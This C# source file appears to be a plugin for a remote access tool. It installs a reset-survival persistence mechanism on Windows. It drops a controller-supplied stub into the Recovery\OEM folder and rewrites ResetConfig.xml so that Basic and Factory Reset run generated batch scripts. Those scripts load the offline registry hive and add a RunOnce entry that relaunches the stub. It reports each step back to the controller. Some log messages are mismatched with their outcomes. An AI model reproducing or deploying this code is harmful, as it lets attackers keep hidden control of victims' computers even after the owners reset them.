

using InvokedCommon.Messages;
using InvokedCommon.Networking;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Xml.Linq;


namespace Plugin.Helper
{
	internal class RSFuncs
	{
		private static readonly Random random = new Random();
		private static readonly string SystemDrive = Path.GetPathRoot(Environment.SystemDirectory);
		private static readonly string OEMPath = Path.Combine(RSFuncs.SystemDrive, "Recovery", "OEM");
		private static readonly string OEMDataBackupPath = Path.Combine(RSFuncs.OEMPath, "XRSBackupData");
		private static readonly string ResetConfigPath = Path.Combine(RSFuncs.OEMPath, "ResetConfig.xml");
		private static Client _client;

		private static string GenerateRandomString(int length)
		{
			return new string(Enumerable.Repeat<string>("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", length).Select<string, char>((Func<string, char>)(s => s[RSFuncs.random.Next(s.Length)])).ToArray<char>());
		}

		private static void SendLog(string logtype, string log)
		{
			RSFuncs._client.Send<NewSurvivalLog>(new NewSurvivalLog()
			{
				log = log,
				logtype = logtype
			});
		}

		public static bool CreateEnvironment()
		{
			if (!Directory.Exists(RSFuncs.OEMPath))
			{
				try
				{
					Directory.CreateDirectory(RSFuncs.OEMPath);
				}
				catch (Exception ex)
				{
					RSFuncs.SendLog("error", ex.Message);
					return false;
				}
			}
			if (Directory.Exists(RSFuncs.OEMDataBackupPath))
				return false;
			Directory.CreateDirectory(RSFuncs.OEMDataBackupPath);
			return true;
		}

		public static void InstallFile(Client client, byte[] fileBytes, string extension)
		{
			RSFuncs._client = client;
			if (RSFuncs.CreateEnvironment())
				RSFuncs.SendLog("success", "Invalid file bytes or file extension");
			else
				RSFuncs.SendLog("error", "Already Installed!");
			List<string> stringList = new List<string>();
			string path2 = RSFuncs.GenerateRandomString(20) + extension;
			stringList.Add(path2);
			try
			{
				File.WriteAllBytes(Path.Combine(RSFuncs.OEMPath, path2), fileBytes);
			}
			catch
			{
				RSFuncs.SendLog("error", "No access!");
				return;
			}
			RSFuncs.SendLog("success", "Stub successfully written");
			string payload = RSFuncs.CreatePayload("wscript %TARGETOSDRIVE%\\Recovery\\OEM\\" + path2, false);
			string basicResetFileName = RSFuncs.GenerateRandomString(20) + ".bat";
			string factoryResetFileName = RSFuncs.GenerateRandomString(20) + ".bat";
			if (RSFuncs.BackupCurrentConfig(basicResetFileName, factoryResetFileName, stringList.ToArray()))
				RSFuncs.SendLog("success", "Successfully backed up current config");
			else
				RSFuncs.SendLog("error", "Error backing up current config");
			RSFuncs.CreateOrUpdateResetConfig(basicResetFileName, factoryResetFileName, payload);
			RSFuncs.SendLog("complete", "Successfully Installed!");
		}

		private static string CreatePayload(string command, bool UseEscaped = true)
		{
			string randomString = RSFuncs.GenerateRandomString(20);
			string str = !UseEscaped ? command : command.Replace("%", "%%").Replace("^", "^^").Replace("&", "^&").Replace("|", "^|").Replace("<", "^<").Replace(">", "^>").Replace("\"", "\"\"");
			return "\r\n@echo off\r\nfor /F \"tokens=1,2,3 delims= \" %%A in ('reg query \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\RecoveryEnvironment\" /v TargetOS') DO SET TARGETOS=%%C\r\n\r\nfor /F \"tokens=1 delims=\\\" %%A in ('Echo %TARGETOS%') DO SET TARGETOSDRIVE=%%A\r\n\r\nreg load HKLM\\" + randomString + " %TARGETOSDRIVE%\\windows\\system32\\config\\SOFTWARE\r\n\r\nreg add HKLM\\" + randomString + "\\Microsoft\\Windows\\CurrentVersion\\RunOnce /v " + randomString + " /t REG_SZ /d \"" + str + "\"\r\n\r\nreg unload HKLM\\" + randomString + "\r\n\r\n\r\n";
		}

		private static bool BackupCurrentConfig(
		  string basicResetFileName,
		  string factoryResetFileName,
		  string[] additionalDeletes = null)
		{
			List<string> contents = new List<string>()
	  {
		basicResetFileName,
		factoryResetFileName
	  };
			if (additionalDeletes != null)
				contents.AddRange((IEnumerable<string>)additionalDeletes);
			try
			{
				File.WriteAllLines(Path.Combine(RSFuncs.OEMDataBackupPath, "DELETEME"), (IEnumerable<string>)contents);
			}
			catch
			{
				return false;
			}
			if (File.Exists(RSFuncs.ResetConfigPath))
			{
				try
				{
					File.Copy(RSFuncs.ResetConfigPath, Path.Combine(RSFuncs.OEMDataBackupPath, "configBackup"), true);
				}
				catch
				{
					return false;
				}
			}
			return true;
		}

		private static void CreateOrUpdateResetConfig(
		  string basicResetFileName,
		  string factoryResetFileName,
		  string payload)
		{
			if (!File.Exists(RSFuncs.ResetConfigPath))
				RSFuncs.CreateNewResetConfig(basicResetFileName, factoryResetFileName, payload);
			else
				RSFuncs.UpdateExistingResetConfig(basicResetFileName, factoryResetFileName, payload);
		}

		private static void CreateNewResetConfig(
		  string basicResetFileName,
		  string factoryResetFileName,
		  string payload)
		{
			new XDocument(new XDeclaration("1.0", "utf-8", (string)null), new object[1]
			{
				(object) new XElement((XName) "Reset", new object[2]
				{
					(object) RSFuncs.CreateRunElement("BasicReset_AfterImageApply", basicResetFileName, 1),
					(object) RSFuncs.CreateRunElement("FactoryReset_AfterImageApply", factoryResetFileName, 1)
				})
			}).Save(RSFuncs.ResetConfigPath);
			RSFuncs.SaveScriptFile(basicResetFileName, payload);
			RSFuncs.SaveScriptFile(factoryResetFileName, payload);
		}

		private static void UpdateExistingResetConfig(
		  string basicResetFileName,
		  string factoryResetFileName,
		  string payload)
		{
			XElement resetConfig = XElement.Load(RSFuncs.ResetConfigPath);
			XElement[] array = resetConfig.Elements((XName)"Run").Where<XElement>((Func<XElement, bool>)(e => (string)e.Attribute((XName)"Phase") == "FactoryReset_AfterImageApply" || (string)e.Attribute((XName)"Phase") == "BasicReset_AfterImageApply")).ToArray<XElement>();
			int duration = ((IEnumerable<XElement>)array).Max<XElement>((Func<XElement, int>)(e => (int)e.Element((XName)"Duration")));
			string additionalCommand1 = RSFuncs.UpdatePhase(array, "BasicReset_AfterImageApply", basicResetFileName);
			string additionalCommand2 = RSFuncs.UpdatePhase(array, "FactoryReset_AfterImageApply", factoryResetFileName);
			if (additionalCommand1 == null)
				RSFuncs.AddNewPhase(resetConfig, "BasicReset_AfterImageApply", basicResetFileName, duration);
			if (additionalCommand2 == null)
				RSFuncs.AddNewPhase(resetConfig, "FactoryReset_AfterImageApply", factoryResetFileName, duration);
			RSFuncs.SaveScriptFile(basicResetFileName, payload, additionalCommand1);
			RSFuncs.SaveScriptFile(factoryResetFileName, payload, additionalCommand2);
			resetConfig.Save(RSFuncs.ResetConfigPath);
		}

		private static XElement CreateRunElement(string phase, string path, int duration)
		{
			return new XElement((XName)"Run", new object[3]
			{
		(object) new XAttribute((XName) "Phase", (object) phase),
		(object) new XElement((XName) "Path", (object) path),
		(object) new XElement((XName) "Duration", (object) duration)
			});
		}

		private static string UpdatePhase(XElement[] phases, string phaseName, string fileName)
		{
			XElement xelement = ((IEnumerable<XElement>)phases).FirstOrDefault<XElement>((Func<XElement, bool>)(p => (string)p.Attribute((XName)"Phase") == phaseName));
			if (xelement == null)
				return (string)null;
			string str1 = "%TARGETOSDRIVE%\\Recovery\\OEM\\" + (string)xelement.Element((XName)"Path");
			string str2 = (string)xelement.Element((XName)"Param") ?? string.Empty;
			xelement.Element((XName)"Param")?.Remove();
			xelement.Element((XName)"Path").Value = fileName;
			return "\"" + str1 + "\" " + str2;
		}

		private static void AddNewPhase(
		  XElement resetConfig,
		  string phaseName,
		  string fileName,
		  int duration)
		{
			XElement runElement = RSFuncs.CreateRunElement(phaseName, fileName, duration);
			resetConfig.Add((object)runElement);
		}

		private static void SaveScriptFile(string fileName, string payload, string additionalCommand = null)
		{
			string contents = payload;
			if (!string.IsNullOrEmpty(additionalCommand))
				contents += additionalCommand;
			try
			{
				File.WriteAllText(Path.Combine(RSFuncs.OEMPath, fileName), contents);
				RSFuncs.SendLog("success", "Error backing up current config");
			}
			catch
			{
				RSFuncs.SendLog("error", "Error writing: " + fileName);
			}
		}

		public static void Uninstall()
		{
			if (!Directory.Exists(RSFuncs.OEMDataBackupPath))
				throw new Exception("Not Installed");
			RSFuncs._Uninstall();
		}

		private static void _Uninstall()
		{
			RSFuncs.RestoreOrDeleteConfigFile();
			RSFuncs.DeleteFilesFromBackup();
			RSFuncs.DeleteBackupFolder();
		}

		private static void RestoreOrDeleteConfigFile()
		{
			string str = Path.Combine(RSFuncs.OEMDataBackupPath, "configBackup");
			if (File.Exists(str))
			{
				File.Copy(str, RSFuncs.ResetConfigPath, true);
			}
			else
			{
				if (!File.Exists(RSFuncs.ResetConfigPath))
					return;
				File.Delete(RSFuncs.ResetConfigPath);
			}
		}

		private static void DeleteFilesFromBackup()
		{
			string path1 = Path.Combine(RSFuncs.OEMDataBackupPath, "DELETEME");
			if (!File.Exists(path1))
				return;
			foreach (string readAllLine in File.ReadAllLines(path1))
			{
				string path2 = Path.Combine(RSFuncs.OEMPath, readAllLine);
				if (File.Exists(path2))
					File.Delete(path2);
			}
		}

		private static void DeleteBackupFolder() => Directory.Delete(RSFuncs.OEMDataBackupPath, true);
	}
}